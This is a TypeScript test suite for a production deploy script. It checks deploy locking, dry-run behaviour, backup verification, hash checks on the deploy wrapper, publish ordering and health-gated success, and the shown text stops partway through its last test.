/**
 * SHIP-RP: infra/aws/ship.sh, run for real against a throwaway repository and a recorded `aws`.
 *
 * ship.sh is the one command that takes a pushed commit to production. What it must never do is the
 * list this file pins, each one a thing that has gone wrong or would:
 *   - deploy while Alembic (or another RawProd ship) is deploying on the same 3.8 GB box. On 2026-11-07
 *     the two builds ran together and the kernel killed Alembic's; the storefront was down ten minutes;
 *   - change anything on a dry run;
 *   - deploy without a backup taken by THIS run, or deploy after the backup failed;
 *   - run a deploy.sh other than the commit's own;
 *   - publish the consoles before deploy.sh's health check passed;
 *   - say green when the box does not run the commit or a host does not answer;
 *   - leave its lock behind.
 *
 * Like host-lock.test.ts: the script itself runs. `git` is real (an origin and a clone in a temp
 * directory), `aws`, `pnpm` and `curl` are stubs that write down what they were asked. The SSM scripts
 * ship.sh would send to the box are captured, and the lock ones are then executed here against a temp
 * lock directory with a real flock(2), so the exclusion below is the kernel's and not a simulation.
 */
import test, { after } from 'node:test';
import assert from 'node:assert/strict';
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import { createHash } from 'node:crypto';
import { execFileSync, spawn, spawnSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
// @ts-expect-error plain ESM, no types
import { verify, isReusableProof, lastDeployed, LOCAL_GATES } from '../../../../infra/aws/ship-evidence.mjs';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '../../../..');
const SHIP = join(ROOT, 'infra/aws/ship.sh');
const BACKUP = join(ROOT, 'infra/aws/backup/rawprod-backup.sh');
const NIGHTLY = join(ROOT, 'infra/aws/nightly-proof.sh');
const src = readFileSync(SHIP, 'utf8');
const dirs: string[] = [];
after(() => dirs.forEach((d) => rmSync(d, { recursive: true, force: true })));

const MAIN = 'i-04e7dc4e5edcc1ff7';
const VAULT = 'i-0edad222a96eeed07';
const sha256 = (s: string | Buffer) => createHash('sha256').update(s).digest('hex');

function stub(bin: string, name: string, body: string) {
  writeFileSync(join(bin, name), body.startsWith('#!') ? body : `#!/usr/bin/env bash\n${body}\n`);
  chmodSync(join(bin, name), 0o755);
}

/** `aws`, recorded. Every call is a line in calls.jsonl; every SSM script sent is kept in sent/. */
const AWS_STUB = `#!/usr/bin/env node
const fs = require('fs'), path = require('path');
const S = process.env.SHIP_TEST_STATE;
const a = process.argv.slice(2).filter((x, i, all) => !['--profile', '--region'].includes(x) && !['--profile', '--region'].includes(all[i - 1]));
const arg = (n) => { const i = a.indexOf(n); return i >= 0 ? a[i + 1] : undefined; };
const log = (o) => fs.appendFileSync(path.join(S, 'calls.jsonl'), JSON.stringify(o) + '\\n');
const reply = (name, dflt) => { const f = path.join(S, 'reply', name); return fs.existsSync(f) ? fs.readFileSync(f, 'utf8').trim() : dflt; };
const sent = () => fs.readFileSync(path.join(S, 'calls.jsonl'), 'utf8').split('\\n').filter(Boolean).map((l) => JSON.parse(l));
const head = fs.readFileSync(path.join(S, 'head'), 'utf8').trim(), base = fs.readFileSync(path.join(S, 'base'), 'utf8').trim();
if (a[0] === 'ssm' && a[1] === 'send-command') {
  const doc = JSON.parse(fs.readFileSync(arg('--cli-input-json').replace('file://', ''), 'utf8'));
  const kind = doc.Comment.replace('rawprod-ship:', '');
  const blob = /echo (\\S+) \\| base64 -d/.exec(doc.Parameters.commands[0])[1];
  const n = fs.readdirSync(path.join(S, 'sent')).length + 1;
  fs.writeFileSync(path.join(S, 'sent', String(n).padStart(2, '0') + '-' + kind + '.sh'), Buffer.from(blob, 'base64'));
  log({ op: 'send', kind, instance: doc.InstanceIds[0], commands: doc.Parameters.commands.length });
  process.stdout.write('cmd-' + kind + '\\n');
} else if (a[0] === 'ssm' && a[1] === 'get-command-invocation') {
  const kind = arg('--command-id').replace('cmd-', ''), q = arg('--query');
  const was = sent().some((c) => c.op === 'send' && c.kind === 'deploy') ? head : base;
  // After a rollback the box names the commit it returned to, whatever it was told to say before.
  const rolled = sent().some((c) => c.op === 'send' && c.kind === 'rollback') && reply('rollback.status', 'Success') === 'Success';
  const deployed = rolled ? reply('rollback_to', reply('previous', 'none')) : reply('deployed', was);
  const out = {
    status: 'deployed=' + deployed + '\\nprevious=' + reply('previous', 'none') + '\\ncheckout=' + (rolled ? deployed : reply('checkout', deployed)) + '\\nmem_available_mb=' + reply('mem', '2400') + '\\nship_lock=' + reply('ship_lock', 'free') + '\\ndeploy_flock=' + reply('deploy_flock', 'free'),
    rollback: 'wrapper=x version=3\\n==> rolling back\\nROLLED BACK TO it.\\nlog=/var/log/rawprod-ship/r.log\\nrollback_exit=0',
    'lock-take': 'locked=yes',
    'lock-release': 'released=yes',
    unlock: 'removed=system=other',
    backup: 'rawprod-backup OK bucket=b key=rawprod/pg_dump/' + reply('backup_stamp', '99991231T235959Z') + '.dump bytes=1800000 sha256=abc entries=40 tables=12',
    deploy: 'wrapper=x\\n==> DEPLOYED\\nlog=/var/log/rawprod-ship/x.log\\ndeploy_exit=0',
    static: 'published /var/www/rawprod-cf/factory\\npublished /var/www/rawprod-cf/platform\\npublished /var/www/rawprod-cf/vault',
  };
  if (q === 'Status') process.stdout.write(reply(kind + '.status', 'Success') + '\\n');
  else if (q === 'StandardOutputContent') process.stdout.write(reply(kind + '.out', out[kind] || '') + '\\n');
  else process.stdout.write('\\n');
} else if (a[0] === 's3api' && a[1] === 'head-object') {
  log({ op: 's3-head', key: arg('--key') });
  if (reply('s3', 'ok') !== 'ok') process.exit(254);
  process.stdout.write(reply('s3.bytes', '1800000') + '\\n');
} else if (a[0] === 'rds') {
  log({ op: 'rds', db: arg('--db-instance-identifier') });
  process.stdout.write(reply('pitr', new Date(Date.now() - 60000).toISOString()) + '\\n');
} else { log({ op: 'other', a }); process.exit(2); }
`;

type Call = { op: string; kind?: string; instance?: string; key?: string; db?: string };

/** An origin, a clone of it, and a PATH on which aws, pnpm and curl only take notes. */
function rig(opt: { pushHead?: boolean; lockInDeploy?: boolean } = {}) {
  const dir = mkdtempSync(join(tmpdir(), 'ship-rp-'));
  dirs.push(dir);
  const bin = join(dir, 'bin');
  const state = join(dir, 'state');
  const origin = join(dir, 'origin.git');
  const clone = join(dir, 'clone');
  [bin, state, join(state, 'sent'), join(state, 'reply'), join(dir, 'tmp')].forEach((d) => mkdirSync(d, { recursive: true }));
  writeFileSync(join(state, 'calls.jsonl'), '');
  writeFileSync(join(state, 'pnpm.log'), '');

  const g = (cwd: string, ...args: string[]) =>
    execFileSync('git', ['-C', cwd, '-c', 'user.name=t', '-c', 'user.email=t@t', '-c', 'init.defaultBranch=main', ...args], { encoding: 'utf8' }).trim();
  execFileSync('git', ['init', '--quiet', '--bare', '-b', 'main', origin]);
  execFileSync('git', ['clone', '--quiet', origin, clone], { stdio: 'ignore' });
  const put = (p: string, text: string) => { mkdirSync(dirname(join(clone, p)), { recursive: true }); writeFileSync(join(clone, p), text); };
  const deploySh = `#!/usr/bin/env bash\n# the wrapper\n${opt.lockInDeploy === false ? '' : 'HOST_LOCK=/run/lock/raw-host-deploy.lock\n'}echo deploy "$@"\n`;
  put('infra/aws/deploy.sh', deploySh);
  put('infra/aws/nginx/install-static.sh', '#!/usr/bin/env bash\necho published\n');
  put('package.json', '{"name":"t","private":true}\n');
  put('web/index.html', '<html>one</html>\n');
  g(clone, 'add', '.');
  g(clone, 'commit', '--quiet', '-m', 'base');
  const base = g(clone, 'rev-parse', 'HEAD');
  g(clone, 'push', '--quiet', 'origin', 'HEAD:main');
  put('web/index.html', '<html>two</html>\n');
  g(clone, 'commit', '--quiet', '-am', 'head');
  const head = g(clone, 'rev-parse', 'HEAD');
  if (opt.pushHead !== false) g(clone, 'push', '--quiet', 'origin', 'HEAD:main');
  writeFileSync(join(state, 'head'), head);
  writeFileSync(join(state, 'base'), base);

  stub(bin, 'aws', AWS_STUB);
  stub(bin, 'pnpm', `echo "pnpm $*" >> "${join(state, 'pnpm.log')}"`);
  // -o <file> gets a body, the way a console's page would arrive; the status goes to stdout.
  stub(bin, 'curl', `out=""; while [ $# -gt 0 ]; do case "$1" in -o) out="$2"; shift ;; esac; shift; done
if [ -n "$out" ] && [ "$out" != /dev/null ]; then cat "${join(state, 'reply', 'curl.body')}" 2>/dev/null > "$out" || printf '<!doctype html><html><body>console</body></html>' > "$out"; fi
printf '%s' "$(cat "${join(state, 'reply', 'curl')}" 2>/dev/null || echo 200)"`);
  stub(bin, 'sleep', '');

  const env = {
    PATH: `${bin}:${dirname(process.execPath)}:/usr/bin:/bin:/usr/sbin:/sbin`,
    HOME: dir,
    TMPDIR: join(dir, 'tmp'),
    SHIP_REPO: clone,
    SHIP_TEST_STATE: state,
    SHIP_SSM_POLL_S: '0',
    SHIP_HEALTH_RETRY_S: '0',
    SHIP_MIN_FREE_GB: '0',
    RAWPROD_SHIP_EVIDENCE: join(dir, 'evidence'),
    // A dry run asks AWS nothing, so it is told what production runs. Tests of the refusal blank this.
    RAWPROD_DEPLOYED_SHA: base,
  };
  const run = (args: string[], extra: Record<string, string> = {}) => {
    const r = spawnSync('bash', [SHIP, ...args], { encoding: 'utf8', env: { ...env, ...extra } });
    return { code: r.status, out: `${r.stdout}${r.stderr}` };
  };
  const calls = (): Call[] => readFileSync(join(state, 'calls.jsonl'), 'utf8').split('\n').filter(Boolean).map((l) => JSON.parse(l) as Call);
  const order = () => calls().map((c) => c.kind ?? c.op);
  const reply = (name: string, text: string) => writeFileSync(join(state, 'reply', name), text);
  const sent = (kind: string) => {
    const f = readdirSync(join(state, 'sent')).sort().find((n) => n.endsWith(`-${kind}.sh`));
    assert.ok(f, `no ${kind} script was sent`);
    return readFileSync(join(state, 'sent', f!), 'utf8');
  };
  const evidence = (of: string = head) => {
    const d = join(dir, 'evidence', of);
    if (!existsSync(d)) return [];
    return readdirSync(d).sort().map((run) => JSON.parse(readFileSync(join(d, run, 'ship.json'), 'utf8')) as {
      verdict: string; mode: string; sha: string; base: string; local_proof: string; seal: string; finished: string;
      gates: { name: string; status: string; detail: string }[]; notes: string[];
    });
  };
  const worktrees = () => g(clone, 'worktree', 'list').split('\n').length;
  return { dir, bin, env, clone, state, base, head, deploySh, g, put, run, calls, order, reply, sent, evidence, worktrees,
    pnpm: () => readFileSync(join(state, 'pnpm.log'), 'utf8') };
}

// ── a dry run changes nothing ───────────────────────────────────────────────────────────────────────

test('a dry run proves the commit locally and makes no AWS call of any kind: nothing sent, nothing read', () => {
  const r = rig();
  const x = r.run([r.head, '--base', r.base]);
  assert.equal(x.code, 0, x.out);
  assert.deepEqual(r.calls(), [], 'not a command to the box, not a status read, not an S3 or RDS call');
  assert.match(x.out, /unread\s+host lock .*dry run: the box was not asked\. --apply reads both locks and takes the ship lock/);
  assert.match(x.out, /dry run: production was not read\. The base is --base/);
  assert.match(x.out, /WOULD RUN on i-04e7dc4e5edcc1ff7: take the ship lock/);
  assert.match(x.out, /WOULD RUN on i-04e7dc4e5edcc1ff7: pg_dump -Fc of rawprod/);
  assert.match(x.out, /WOULD RUN on i-04e7dc4e5edcc1ff7: install [0-9a-f]{8}'s own deploy\.sh/);
  assert.match(x.out, /WOULD RUN on i-04e7dc4e5edcc1ff7: infra\/aws\/nginx\/install-static\.sh prod/);
  assert.match(x.out, /WOULD CHECK: https:\/\/rawfactory\.huecycle\.in\/health, https:\/\/rawplatform\.huecycle\.in\/health, https:\/\/rawvault\.huecycle\.in\/health/);
  assert.match(x.out, /VERDICT: DRY RUN PASSED/);
  // The local steps ran for real: install, typecheck, and the build the box runs, in a fresh worktree.
  const p = r.pnpm();
  assert.match(p, /pnpm -C \S+\/head install --frozen-lockfile/);
  assert.match(p, /pnpm -C \S+\/head typecheck/);
  assert.match(p, /pnpm -C \S+\/head -r --workspace-concurrency=1 --filter !@core\/admin-shell --filter !@core\/api build/);
  assert.equal(r.worktrees(), 1, 'the worktree is removed after a pass');
});

test('a dry run has to be told what production runs, or to have seen it: it refuses rather than guess or ask', () => {
  const r = rig();
  const blank = { RAWPROD_DEPLOYED_SHA: '' };
  const noBase = r.run([r.head], blank);
  assert.notEqual(noBase.code, 0);
  assert.match(noBase.out, /a dry run makes no AWS call, so it cannot ask i-04e7dc4e5edcc1ff7 what production runs/);
  assert.match(noBase.out, /--base <deployed sha>/);
  assert.equal(r.pnpm(), '', 'nothing was built against a base nobody named');
  // --offline is what a dry run already is. It is still accepted, and still cannot deploy.
  assert.equal(r.run([r.head, '--offline', '--base', r.base], blank).code, 0);
  assert.notEqual(r.run([r.head, '--offline', '--base', r.base, '--apply']).code, 0, '--offline cannot deploy');
  assert.deepEqual(r.calls(), []);

  // After a green ship from this laptop, the next dry run knows what production runs without asking.
  const g = rig();
  assert.equal(g.run([g.head, '--apply']).code, 0);
  const before = g.calls().length;
  g.put('web/index.html', '<html>three</html>\n');
  g.g(g.clone, 'commit', '--quiet', '-am', 'next');
  const next = g.g(g.clone, 'rev-parse', 'HEAD');
  g.g(g.clone, 'push', '--quiet', 'origin', 'HEAD:main');
  const dry = g.run([next], blank);
  assert.equal(dry.code, 0, dry.out);
  assert.match(dry.out, /The base is this laptop's last green ship for --role main/);
  assert.equal(g.evidence(next).pop()!.base, g.head);
  assert.equal(g.calls().length, before, 'and still asked AWS nothing');
  assert.equal(lastDeployed(join(g.dir, 'evidence'), 'main'), g.head);
  assert.equal(lastDeployed(join(g.dir, 'evidence'), 'vault'), '', 'a ship to the other box says nothing about this one');
});

test('every run leaves a sealed evidence file, a failed one included', () => {
  const r = rig();
  r.run([r.head]);
  const [e] = r.evidence();
  assert.ok(e, 'ship.json was written');
  assert.equal(verify(e), true, 'the seal matches the content');
  assert.equal(e!.sha, r.head);
  assert.equal(e!.base, r.base);
  assert.equal(e!.mode, 'dry-run');
  assert.equal(e!.local_proof, 'ok');
  for (const name of LOCAL_GATES as string[]) assert.ok(e!.gates.some((g) => g.name === name), `gate "${name}" is recorded`);
  assert.equal(verify({ ...e, verdict: 'DEPLOYED GREEN' }), false, 'an edited file no longer verifies');

  const bad = rig();
  bad.reply('ship_lock', 'system=other role=main sha=abc started=2026-11-12T08:00:00Z by=op@laptop');
  assert.notEqual(bad.run([bad.head, '--apply']).code, 0);
  const [f] = bad.evidence();
  assert.match(f!.verdict, /^FAILED at local: REFUSED/);
  assert.equal(verify(f), true);
});

// ── one deploy per host ─────────────────────────────────────────────────────────────────────────────

test('--apply refuses while another ship holds the lock, names the holder and its age, and touches nothing', () => {
  const r = rig();
  r.reply('ship_lock', 'system=other role=main sha=0123abcd started=2026-11-12T08:00:00Z by=op@laptop');
  const x = r.run([r.head, '--apply']);
  assert.notEqual(x.code, 0);
  assert.match(x.out, /REFUSED: the ship lock on i-04e7dc4e5edcc1ff7 is held: system=other role=main sha=0123abcd started=2026-11-12T08:00:00Z/);
  assert.match(x.out, /One deploy per host/);
  assert.match(x.out, /that lock was taken \d+ min ago\. A ship holds it for at most about 100 min, so this one is STALE unless a deploy is running/);
  assert.match(x.out, /ship\.sh --unlock --role main --apply/);
  assert.deepEqual(r.order(), ['status'], 'no lock, no backup, no deploy was sent');
  const fresh = rig();
  fresh.reply('ship_lock', `system=other role=main sha=0123abcd started=${new Date().toISOString().replace(/\.\d+Z$/, 'Z')} by=op@laptop`);
  assert.match(fresh.run([fresh.head, '--apply']).out, /taken \d+ min ago\. A ship can hold it for about 100 min: that one is probably still alive/);
  assert.equal(r.pnpm(), '', 'and the laptop did not spend ten minutes building first');
});

test('--apply refuses while a deploy process holds the kernel lock, whichever system started it', () => {
  for (const holder of ['held by alembic pid 4242 since 2026-11-12T08:00:00Z', 'held by rawprod pid 77 since 2026-11-12T08:00:00Z']) {
    const r = rig();
    r.reply('deploy_flock', holder);
    const x = r.run([r.head, '--apply']);
    assert.notEqual(x.code, 0);
    assert.match(x.out, new RegExp(`REFUSED: a deploy is running on ${MAIN} right now \\(${holder}\\)`));
    assert.deepEqual(r.order(), ['status']);
  }
});

test('a dry run does not read the lock: held or free, it proves the commit and leaves the question to --apply', () => {
  const r = rig();
  r.reply('ship_lock', 'system=other role=main sha=0123abcd started=2026-11-12T08:00:00Z by=op@laptop');
  const x = r.run([r.head]);
  assert.equal(x.code, 0, x.out);
  assert.match(x.out, /unread\s+host lock/);
  assert.deepEqual(r.calls(), []);
});

test('two ships that both saw a free lock: the one the box refuses stops before the backup', () => {
  const r = rig();
  r.reply('lock-take.status', 'Failed');
  r.reply('lock-take.out', 'REFUSED: the ship lock is held: system=other role=main sha=0123abcd started=2026-11-12T08:00:00Z by=op@laptop');
  const x = r.run([r.head, '--apply']);
  assert.notEqual(x.code, 0);
  assert.match(x.out, /REFUSED: the ship lock is held: system=other.*One deploy per host\. Nothing on i-04e7dc4e5edcc1ff7 was changed/);
  assert.deepEqual(r.order(), ['status', 'lock-take'], 'no backup, no deploy, and no release of a lock that was never ours');
});

test('the lock scripts, run for real: O_EXCL on the ship lock, flock(2) on the deploy lock, release only of our own line', async () => {
  const r = rig();
  assert.equal(r.run([r.head, '--apply']).code, 0);
  r.reply('ship_lock', 'system=rawprod role=main sha=dead started=then by=gone');
  assert.equal(r.run(['--unlock', '--apply']).code, 0, 'the unlock script is captured for the end of this test');
  const lockDir = join(r.dir, 'run-lock');
  const etc = join(r.dir, 'etc-rawprod');
  mkdirSync(lockDir);
  const bin = join(r.dir, 'lockbin');
  mkdirSync(bin);
  // macOS has no flock(1). `flock -n FILE CMD`, with a real flock(2) underneath.
  stub(bin, 'flock', `exec python3 -c '
import fcntl, sys, subprocess
f = open(sys.argv[2], "a")
try: fcntl.flock(f, fcntl.LOCK_EX | fcntl.LOCK_NB)
except OSError: sys.exit(1)
sys.exit(subprocess.call(sys.argv[3:]))
' "$@"`);
  const local = (kind: string, line?: string) => {
    let s = r.sent(kind)
      .replace(/^SHIP_LOCK=.*$/m, `SHIP_LOCK=${join(lockDir, 'raw-host-ship.lock')}`)
      .replace(/^DEPLOY_LOCK=.*$/m, `DEPLOY_LOCK=${join(lockDir, 'raw-host-deploy.lock')}`)
      .replaceAll('/etc/rawprod', etc);
    if (line) s = s.replace(/^LOCK_LINE=.*$/m, `LOCK_LINE='${line}'`);
    const x = spawnSync('bash', ['-c', s], { encoding: 'utf8', env: { PATH: `${bin}:/usr/bin:/bin` } });
    return { code: x.status, out: `${x.stdout}${x.stderr}` };
  };
  const ship = join(lockDir, 'raw-host-ship.lock');

  const first = local('lock-take');
  assert.equal(first.code, 0, first.out);
  const ours = readFileSync(ship, 'utf8').trim();
  assert.match(ours, new RegExp(`^system=rawprod role=main sha=${r.head} started=\\d{4}-\\d\\d-\\d\\dT\\d\\d:\\d\\d:\\d\\dZ by=\\S+ pid=\\d+$`), 'the lock says who, what, since when and which process');

  const second = local('lock-take', 'system=other role=main sha=feed started=now by=other');
  assert.equal(second.code, 75);
  assert.match(second.out, new RegExp(`REFUSED: the ship lock is held: system=rawprod role=main sha=${r.head}`));
  assert.equal(readFileSync(ship, 'utf8').trim(), ours, 'the loser did not overwrite the holder');

  // Somebody else's release leaves our lock alone; ours removes it and writes the box log.
  assert.match(local('lock-release', 'system=other role=main sha=feed started=now by=other').out, /released=not-ours/);
  assert.ok(existsSync(ship));
  assert.match(local('lock-release').out, /released=yes/);
  assert.equal(existsSync(ship), false);
  const logLine = JSON.parse(readFileSync(join(etc, 'ship-log.jsonl'), 'utf8').trim().split('\n').pop()!) as { sha: string; role: string; verdict: string };
  assert.equal(logLine.sha, r.head);
  assert.match(logLine.verdict, /DEPLOYED GREEN/);

  // A deploy process holding the kernel lock, the way deploy.sh and Alembic's deploy-sha.sh hold it.
  const holder = spawn('python3', ['-c', `
import fcntl, sys, time
f = open(sys.argv[1], 'a')
fcntl.flock(f, fcntl.LOCK_EX)
f.write('alembic pid 42 since then\\n'); f.flush()
print('held', flush=True)
time.sleep(60)
`, join(lockDir, 'raw-host-deploy.lock')], { stdio: ['ignore', 'pipe', 'inherit'] });
  await new Promise((resolve) => holder.stdout.once('data', resolve));
  try {
    const blocked = local('lock-take');
    assert.equal(blocked.code, 75);
    assert.match(blocked.out, /REFUSED: a deploy holds the host lock: alembic pid 42 since then/);
    assert.equal(existsSync(ship), false, 'no ship lock is left behind by a refusal');
    assert.match(local('status').out, /deploy_flock=held by alembic pid 42 since then/);
    // The override does not outrank a running deploy: --unlock leaves the lock while the flock is held.
    writeFileSync(ship, 'system=rawprod role=main sha=dead started=then by=gone\n');
    const busy = local('unlock');
    assert.equal(busy.code, 75);
    assert.match(busy.out, /REFUSED: a deploy holds the host lock right now: alembic pid 42 since then/);
    assert.ok(existsSync(ship));
  } finally {
    const gone = new Promise((resolve) => holder.once('exit', resolve));
    holder.kill();
    await gone;
  }
  // The box removes only the line the operator was shown: a ship that took the host since then keeps it.
  writeFileSync(ship, 'system=rawprod role=main sha=newer started=now by=someone pid=1\n');
  const moved = local('unlock');
  assert.equal(moved.code, 75);
  assert.match(moved.out, /REFUSED: the lock changed since it was read: system=rawprod role=main sha=newer/);
  assert.ok(existsSync(ship));
  writeFileSync(ship, 'system=rawprod role=main sha=dead started=then by=gone\n');
  const cleared = local('unlock');
  assert.equal(cleared.code, 0, cleared.out);
  assert.match(cleared.out, /removed=system=rawprod role=main sha=dead/);
  assert.equal(existsSync(ship), false);
});

test('--unlock is the manual override: it shows the lock, refuses while a deploy runs, and removes it only with --apply', () => {
  const r = rig();
  r.reply('ship_lock', 'system=rawprod role=main sha=dead started=2026-11-11T08:00:00Z by=gone@laptop');
  const dry = r.run(['--unlock']);
  assert.equal(dry.code, 0, dry.out);
  assert.match(dry.out, /WOULD READ on i-04e7dc4e5edcc1ff7: \/run\/lock\/raw-host-ship\.lock/);
  assert.match(dry.out, /WOULD RUN on i-04e7dc4e5edcc1ff7: remove \/run\/lock\/raw-host-ship\.lock/);
  assert.deepEqual(r.calls(), [], 'without --apply the box is not even read');

  r.reply('deploy_flock', 'held by alembic pid 42 since then');
  const busy = r.run(['--unlock', '--apply']);
  assert.notEqual(busy.code, 0);
  assert.match(busy.out, /ship lock on i-04e7dc4e5edcc1ff7 : system=rawprod role=main sha=dead/);
  assert.match(busy.out, /the lock was taken \d+ min ago\..* STALE unless a deploy is running/);
  assert.match(busy.out, /a deploy is running .* The lock is not stale/);
  assert.deepEqual(r.order(), ['status'], 'nothing was removed');

  r.reply('deploy_flock', 'free');
  const done = r.run(['--unlock', '--apply']);
  assert.equal(done.code, 0, done.out);
  assert.deepEqual(r.order().slice(-2), ['status', 'unlock']);
  assert.match(r.sent('unlock'), /flock -n "\$DEPLOY_LOCK" true \|\| \{ echo "REFUSED/, 'the box checks again before removing');
  assert.match(r.sent('unlock'), /^LOCK_LINE=.*sha=dead/m, 'and is told which line it may remove');
});

test('--unlock leaves a young lock alone unless this laptop took it and that ship is dead: a free flock is not a dead ship', () => {
  // Between its backup, its publish and its health check a live ship holds no flock.
  const now = new Date().toISOString().replace(/\.\d+Z$/, 'Z');
  const me = execFileSync('bash', ['-c', `printf '%s@%s' "$(id -un)" "$(hostname -s 2>/dev/null || echo laptop)" | tr -c 'A-Za-z0-9._@-' '_'`], { encoding: 'utf8' });

  const theirs = rig();
  theirs.reply('ship_lock', `system=rawprod role=main sha=live started=${now} by=colleague@other-laptop pid=4242`);
  const a = theirs.run(['--unlock', '--apply']);
  assert.notEqual(a.code, 0);
  assert.match(a.out, /taken by colleague@other-laptop from another laptop.*probably a deploy in progress/);
  assert.deepEqual(theirs.order(), ['status'], 'nothing was removed');

  const alive = rig();
  // `; :` keeps bash from exec'ing sleep in its place, so ps shows the ship.sh name the check looks for.
  const holder = spawn('bash', ['-c', 'sleep 30; :', 'infra/aws/ship.sh'], { stdio: 'ignore' });
  try {
    alive.reply('ship_lock', `system=rawprod role=main sha=live started=${now} by=${me} pid=${holder.pid}`);
    const b = alive.run(['--unlock', '--apply']);
    assert.notEqual(b.code, 0);
    assert.match(b.out, new RegExp(`its ship is still running on this laptop \\(pid ${holder.pid}\\)`));
    assert.deepEqual(alive.order(), ['status']);
  } finally { holder.kill(); }

  const dead = rig();
  dead.reply('ship_lock', `system=rawprod role=main sha=gone started=${now} by=${me} pid=999999`);
  const c = dead.run(['--unlock', '--apply']);
  assert.equal(c.code, 0, c.out);
  assert.match(c.out, /pid 999999, which is no longer running: the ship that held it is dead/);
  assert.deepEqual(dead.order(), ['status', 'unlock']);
});

// ── the order of a deploy ───────────────────────────────────────────────────────────────────────────

test('--apply: lock, backup read back from S3, the commit\'s own deploy.sh, the consoles, health, release', () => {
  const r = rig();
  const x = r.run([r.head, '--apply']);
  assert.equal(x.code, 0, x.out);
  assert.deepEqual(r.order(), ['status', 'lock-take', 'backup', 's3-head', 'deploy', 'static', 'status', 'lock-release']);
  assert.ok(r.calls().filter((c) => c.op === 'send').every((c) => c.instance === MAIN));
  assert.match(x.out, /VERDICT: DEPLOYED GREEN/);
  assert.match(x.out, /ship lock released/);

  // The wrapper that runs is the commit's, proven by hash on the box before it is installed.
  const deploy = r.sent('deploy');
  assert.match(deploy, new RegExp(`^WANT_DEPLOY_SHA256=${sha256(r.deploySh)}$`, 'm'));
  assert.match(deploy, new RegExp(`^SHA=${r.head}$`, 'm'));
  assert.match(deploy, /^ROLE=main$/m);
  const iShow = deploy.indexOf('git -C "$APP" show "$SHA:infra/aws/deploy.sh"');
  const iCmp = deploy.indexOf('[ "$got" = "$WANT_DEPLOY_SHA256" ] ||');
  const iInstall = deploy.indexOf('/usr/local/sbin/rawprod-deploy; rm -f');
  const iRun = deploy.indexOf('RAWPROD_ROLE="$ROLE" /usr/local/sbin/rawprod-deploy "$SHA"');
  assert.ok(iShow > 0 && iShow < iCmp && iCmp < iInstall && iInstall < iRun, 'show, compare, install, run: in that order');

  // The consoles: only once DEPLOYED_SHA (written by deploy.sh after ITS health check) is this commit.
  const stat = r.sent('static');
  assert.ok(stat.indexOf('[ "$(cat /srv/rawprod/DEPLOYED_SHA 2>/dev/null)" = "$SHA" ] ||') < stat.indexOf('install-static.sh" prod'));
  assert.match(stat, /bash "\$APP\/infra\/aws\/nginx\/install-static\.sh" prod/);

  // The backup script that runs on the box is the one in this repository, byte for byte.
  const backup = r.sent('backup');
  assert.match(backup, new RegExp(`^WANT_BACKUP_SHA256=${sha256(readFileSync(BACKUP))}$`, 'm'));
  const b64 = /^BACKUP_B64=(\S+)$/m.exec(backup)![1]!;
  assert.equal(Buffer.from(b64, 'base64').toString('utf8'), readFileSync(BACKUP, 'utf8'));

  const e = r.evidence().pop()!;
  assert.match(e.verdict, /^DEPLOYED GREEN/);
  assert.equal(e.gates.find((g) => g.name === 'backup')!.status, 'ok');
  assert.match(e.gates.find((g) => g.name === 'backup')!.detail, /rawprod\/pg_dump\/99991231T235959Z\.dump, 1800000 bytes, read back/);
});

test('a failed backup stops the ship before the deploy, and the lock is released', () => {
  const r = rig();
  r.reply('backup.status', 'Failed');
  r.reply('backup.out', 'pg_dump: error: connection to server failed\nforged=1\nrawprod-backup FAILED: pg_dump failed');
  const x = r.run([r.head, '--apply']);
  assert.notEqual(x.code, 0);
  assert.match(x.out, /the backup failed, so nothing was deployed/);
  assert.deepEqual(r.order(), ['status', 'lock-take', 'backup', 'lock-release']);
  // The verdict quotes two lines of the box's output. It stays ONE field of the evidence: a line of a
  // log that happens to read `key=value` must not become a key of ship.json.
  const e = r.evidence().pop()! as unknown as Record<string, unknown>;
  assert.match(String(e.verdict), /^FAILED at backup: the backup failed, so nothing was deployed: forged=1 rawprod-backup FAILED: pg_dump failed$/);
  assert.equal('forged' in e, false);
  assert.equal(verify(e), true);
});

test('a backup that is not this run\'s, or not the size the box dumped, is not a backup', () => {
  // Review focus 3 of the plan: an object older than the ship (last week's drill) must not count.
  const old = rig();
  old.reply('backup_stamp', '20200101T000000Z');
  const a = old.run([old.head, '--apply']);
  assert.notEqual(a.code, 0);
  assert.match(a.out, /is older than this ship .* No deploy was started/);
  assert.equal(old.order().includes('deploy'), false);
  assert.equal(old.order().pop(), 'lock-release');

  const short = rig();
  short.reply('s3.bytes', '12');
  const b = short.run([short.head, '--apply']);
  assert.notEqual(b.code, 0);
  assert.match(b.out, /is 12 bytes and the box dumped 1800000\. No deploy was started/);
  assert.equal(short.order().includes('deploy'), false);

  const gone = rig();
  gone.reply('s3', 'missing');
  const c = gone.run([gone.head, '--apply']);
  assert.notEqual(c.code, 0);
  assert.match(c.out, /cannot be read back\. No deploy was started/);
  assert.equal(gone.order().includes('deploy'), false);
});

test('a backup the box calls OK is still judged here: under the floor it is not this database', () => {
  // The box checks its own floor; that is the box's word about its own run. The laptop checks again.
  const r = rig();
  r.reply('backup.out', 'rawprod-backup OK bucket=b key=rawprod/pg_dump/99991231T235959Z.dump bytes=1200 sha256=abc entries=3 tables=1');
  r.reply('s3.bytes', '1200');
  const x = r.run([r.head, '--apply']);
  assert.notEqual(x.code, 0);
  assert.match(x.out, /is 1200 bytes, under the floor of 500000: that is not this database\. No deploy was started/);
  assert.equal(r.order().includes('deploy'), false);
  assert.equal(r.order().pop(), 'lock-release');
});

test('a failed deploy.sh publishes no console, prints the way back, and releases the lock', () => {
  const r = rig();
  r.reply('deploy.status', 'Failed');
  r.reply('deploy.out', 'FATAL: build failed (exit 137)\ndeploy_exit=1');
  const x = r.run([r.head, '--apply']);
  assert.notEqual(x.code, 0);
  assert.match(x.out, /FATAL: build failed \(exit 137\)/, 'the end of deploy.sh\'s output is shown');
  assert.match(x.out, /rawprod-deploy --rollback/);
  assert.deepEqual(r.order(), ['status', 'lock-take', 'backup', 's3-head', 'deploy', 'lock-release']);
  assert.match(r.evidence().pop()!.verdict, /^DEPLOY FAILED/);
});

test('green is said only when the box runs the commit and all three hosts answer /health', () => {
  const red = rig();
  red.reply('curl', '502');
  const a = red.run([red.head, '--apply']);
